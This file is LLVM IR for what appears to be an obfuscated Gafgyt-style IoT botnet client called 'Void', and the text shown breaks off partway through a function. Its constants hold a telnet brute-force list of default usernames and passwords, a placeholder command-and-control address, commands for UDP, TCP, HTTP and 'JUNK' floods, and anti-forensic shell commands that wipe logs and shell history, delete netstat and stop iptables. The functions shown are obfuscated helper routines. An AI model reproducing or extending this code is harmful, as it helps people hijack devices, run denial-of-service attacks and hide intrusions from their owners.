; ModuleID = 'host/ir_sub/Void.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [14 x i8] c"PAYLOADZZZZ\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"IP:23\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.31 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.112 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.40 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.43 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.45 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"sername:\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.55 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.56 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.59 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.63 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.68 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.74 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.85 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.87 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.88 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.90 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.91 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.93 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.94 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.96 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"DONGS\00", align 1
@.str.99 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"sshd\00", align 1
@.str.102 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, -1640531527
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %11 = load i32, i32* %2, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, -1640531527
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add i32 %11, -1640531527
  %17 = sub i32 %15, -635505359
  %18 = add i32 %17, -1640531527
  %19 = add i32 %18, -635505359
  %20 = add i32 %15, -1640531527
  store i32 %19, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %21

; <label>:21:                                     ; preds = %67, %1
  %22 = load i32, i32* %3, align 4
  %23 = icmp slt i32 %22, 4096
  br i1 %23, label %24, label %74

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %3, align 4
  %26 = sub i32 0, 3
  %27 = add i32 %25, %26
  %28 = sub nsw i32 %25, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = add i32 %32, -1520455786
  %34 = sub i32 %33, 2
  %35 = sub i32 %34, -1520455786
  %36 = sub nsw i32 %32, 2
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %31, -1
  %41 = and i32 -43641925, %40
  %42 = xor i32 -43641925, -1
  %43 = and i32 %31, %42
  %44 = xor i32 %39, -1
  %45 = and i32 %44, -43641925
  %46 = and i32 %39, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %31, %39
  %51 = xor i32 %49, -1
  %52 = and i32 -1640531527, %51
  %53 = xor i32 -1640531527, -1
  %54 = and i32 %49, %53
  %55 = or i32 %52, %54
  %56 = xor i32 %49, -1640531527
  %57 = load i32, i32* %3, align 4
  %58 = xor i32 %55, -1
  %59 = and i32 %57, %58
  %60 = xor i32 %57, -1
  %61 = and i32 %55, %60
  %62 = or i32 %59, %61
  %63 = xor i32 %55, %57
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %65
  store i32 %62, i32* %66, align 4
  br label %67

; <label>:67:                                     ; preds = %24
  %68 = load i32, i32* %3, align 4
  %69 = sub i32 0, %68
  %70 = sub i32 0, 1
  %71 = add i32 %69, %70
  %72 = sub i32 0, %71
  %73 = add nsw i32 %68, 1
  store i32 %72, i32* %3, align 4
  br label %21

; <label>:74:                                     ; preds = %21
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 %9, -1
  %12 = xor i32 4095, -1
  %13 = xor i32 1110582859, -1
  %14 = or i32 %11, %12
  %15 = or i32 1110582859, %13
  %16 = xor i32 %14, -1
  %17 = and i32 %16, %15
  %18 = and i32 %9, 4095
  store i32 %17, i32* @rand_cmwc.i, align 4
  %19 = load i64, i64* %2, align 8
  %20 = load i32, i32* @rand_cmwc.i, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = mul i64 %19, %24
  %26 = load i32, i32* @c, align 4
  %27 = zext i32 %26 to i64
  %28 = sub i64 0, %27
  %29 = sub i64 %25, %28
  %30 = add i64 %25, %27
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = sub i64 %34, -7207729708825586521
  %38 = add i64 %37, %36
  %39 = add i64 %38, -7207729708825586521
  %40 = add i64 %34, %36
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %56

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* %3, align 4
  %50 = load i32, i32* @c, align 4
  %51 = sub i32 0, %50
  %52 = sub i32 0, 1
  %53 = add i32 %51, %52
  %54 = sub i32 0, %53
  %55 = add i32 %50, 1
  store i32 %54, i32* @c, align 4
  br label %56

; <label>:56:                                     ; preds = %45, %0
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %59 = add i32 %57, -603646153
  %60 = sub i32 %59, %58
  %61 = sub i32 %60, -603646153
  %62 = sub i32 %57, %58
  %63 = load i32, i32* @rand_cmwc.i, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = sub i32 %22, -134396386
  %24 = add i32 %23, 1
  %25 = add i32 %24, -134396386
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %4, align 4
  br label %12

; <label>:27:                                     ; preds = %12
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %50

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, -1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, -1
  store i32 %48, i32* %5, align 4
  br label %28

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %77

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = add i32 %63, 1108848828
